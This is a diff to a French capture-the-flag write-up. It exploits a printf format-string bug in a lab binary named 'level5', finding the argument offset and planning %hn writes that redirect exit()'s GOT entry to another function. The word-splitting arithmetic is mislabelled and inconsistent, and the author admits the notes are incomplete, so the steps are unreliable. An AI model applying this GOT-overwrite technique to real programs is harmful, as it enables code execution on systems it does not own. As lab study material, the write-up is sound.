@@ -10,6 +10,7 @@
 	- Breakpoint sur `n` puis désassemblage complet.
 	- `n` lit l’entrée (`fgets`), passe notre buffer à `printf`, puis appelle `exit`.
 	- Dans `exit@plt`, on observe le saut indirect vers l’entrée GOT à `0x8049838`.
+	- injection de format possible avec `printf()`
 
 ## 3) Exploitation & flag
 - Étapes :
@@ -20,6 +21,23 @@
 	- `gdb` puis `b n`, `r`.
 	- `disassemble` sur `n`.
 	- `disassemble 0x80483d0` et `x 0x8049838`.
+- Trouver l'offset des paramètres de printf pour retomber sur notre string
+	```sh
+	./level5
+	AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+	AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 a7825
+	```
+	le 41414141 représentant nos 4 A de début de string se retrouvent à la 4ème position
+- Exploitation de l'injection de format
+	avec le format `%4$hn` nous pouvons imprimer le nombre de charactère imprimés jusqu'à là dans la 4ème variable sur 2 bytes.
+	il nous suffit donc de commencer notre payload par l'adresse de `exit()` dans la GOT + l'adresse + 2
+	ensuite on imprime le nombre de charactères nécessaires pour représenter l'adresse `0x080484a4`
+	on commence par le low word `0x0804` (33956 - 8 (taille des 2 adresse) = 33948) avec `%33948x%4$hn`
+	puis le high word `0x84a4` ((65535 + 1 (overflow pour refaire une plus petite valeur) - 33956) + 2052 = 33632) avec `%33632x%5$hn`
+
+(python exploit.py; cat) | ./level5
+
+
 
 
 Il manque des informations, je sais plus comment on exploit au final.
